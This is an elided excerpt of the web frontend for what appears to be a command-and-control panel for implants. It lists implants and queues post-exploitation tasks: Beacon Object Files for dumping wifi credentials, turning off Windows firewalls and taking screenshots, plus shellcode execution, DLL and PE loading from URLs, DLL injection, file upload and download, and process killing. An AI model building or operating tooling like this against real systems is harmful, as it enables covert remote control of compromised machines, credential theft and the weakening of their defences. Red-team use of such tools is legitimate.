      ...
      <div class="page" id="page-bofs">
        ...
        <div class="bof-layout">
          ...
          <div class="bof-execute-section">
            ...
            <div class="form-group" id="bofEntryGroup" style="display:none">
              <label class="form-label">entry point <span style="color:var(--text-dim);font-size:10px">(c++ bof)</span></label>
              <select class="form-input" id="bofEntryPoint">
                <option value="go">go (default)</option>
              </select>
            </div>
            <div class="form-group">
              <label class="form-label">arguments (optional)</label>
              <input type="text" class="form-input" id="bofArgs" placeholder="z=str i=int s=short b=hex (e.g. zHello i42)">
            </div>
      ...
      <div class="command-section">
        ...
        <div class="command-row">
          <select class="command-select" id="commandType">
            ...
            <option value="execute">execute (shellcode)</option>
...
function startPolling() {
  loadData();
  pollInterval = setInterval(loadData, 1000);
}
...
async function loadImplants() {
  ...
  // Server already calculates alive status using UTC timestamps
...
function saveDownloadResult(taskId, b64Data) {
  try {
    ...
    const filename = 'download_' + taskId.substring(0, 8) + '.bin';
...
function formatOutput(b64, taskType, taskId) {
  if (!b64) return '';
  try {
    ...
    if (taskType === 'download') {
      const sizeInfo = decoded.length > 1024
        ? (decoded.length / 1024).toFixed(1) + ' KB'
        : decoded.length + ' bytes';
      return escapeHtml(decoded.substring(0, 500)) +
        (decoded.length > 500 ? '\n... [truncated]' : '') +
        '\n<button class="save-download-btn" onclick="saveDownloadResult(\'' + taskId + '\', \'' + b64 + '\')">save file (' + sizeInfo + ')</button>';
    }
...
// Known BOFs with custom entry points (C++ BOFs)
const bofEntryPoints = {
  'fw_walk.x64.o': ['GetFWStatus', 'AllRulesVerbose', 'DisableAllWindowsSoftwareFirewalls', 'EnableAllWindowsSoftwareFirewalls'],
  'list_firewall_rules.x64.o': ['AllRulesVerbose', 'GetFWStatus'],
  'wifidump.x64.o': ['wifidump', 'wifienum'],
  'process_imports.x64.o': ['needleGetImportedDLLNamesWin32', 'getImportedDLLNamesWin32']
};
...
async function selectBOF(name) {
  ...
  // Handle custom entry points for C++ BOFs
  const entryGroup = document.getElementById('bofEntryGroup');
  const entrySelect = document.getElementById('bofEntryPoint');

  if (bofEntryPoints[name]) {
    // Show entry point dropdown and populate options
    const entries = bofEntryPoints[name];
    entrySelect.innerHTML = entries.map((e, i) =>
      ` + "`" + `<option value="${e}"${i === 0 ? ' selected' : ''}>${e}${i === 0 ? ' (recommended)' : ''}</option>` + "`" + `
    ).join('');
    entryGroup.style.display = 'block';
  } else {
    // Hide entry point dropdown and reset to default
    entryGroup.style.display = 'none';
    entrySelect.innerHTML = '<option value="go">go (default)</option>';
  }
  ...
  if (name.toLowerCase().includes('screenshot')) {
    ...
    if (activeListener) {
      ...
      argsInput.placeholder = 'zserver:port iPid iGrayscale iQuality iScale';
    } else {
      argsInput.placeholder = 'start a listener first for screenshot';
    }
  } else {
    argsInput.value = '';
    argsInput.placeholder = 'z=str i=int s=short b=hex (e.g. zHello i42)';
  }
}
...
async function executeBOF() {
  ...
  const entryPoint = document.getElementById('bofEntryPoint').value;

  // Build JSON metadata with entry point if non-default
  let metadata = {};
  if (entryPoint && entryPoint !== 'go') {
    metadata.entry = entryPoint;
  }

  // Split space-separated args and prepend JSON metadata
  const bofArgs = argsStr ? argsStr.split(/\s+/) : [];
  const taskArgs = [JSON.stringify(metadata), ...bofArgs];
  ...
  toast('bof queued: ' + selectedBOF + (entryPoint !== 'go' ? ' (' + entryPoint + ')' : ''), 'success');
}
  ...
  switch (this.value) {
    case 'screenshot':
      ...
      if (activeListener) {
        ...
        argsInput.value = 'z' + serverHost + ':' + activeListener.port + ' i0 i0 i70 i100';
        argsInput.placeholder = 'BOF args: z=str i=int s=short b=hex';
      } else {
    ...
    case 'upload':
      argsInput.value = '';
      argsInput.placeholder = 'destination path (data via task.data)';
      break;
    case 'kill':
      argsInput.value = '';
      argsInput.placeholder = 'PID to terminate';
      break;
    case 'bof':
      argsInput.value = '';
      argsInput.placeholder = 'BOF args: z=str i=int s=short b=hex';
    ...
    case 'exit':
      argsInput.value = '';
      argsInput.placeholder = 'WARNING: terminates implant!';
      break;
    case 'execute':
      argsInput.value = '';
      argsInput.placeholder = 'use shellcode page for file upload';
      break;
    case 'load_dll':
    case 'load_pe':
      argsInput.value = '';
      argsInput.placeholder = 'URL to download from (or use task.data)';
      break;
    case 'inject_dll':
      argsInput.value = '';
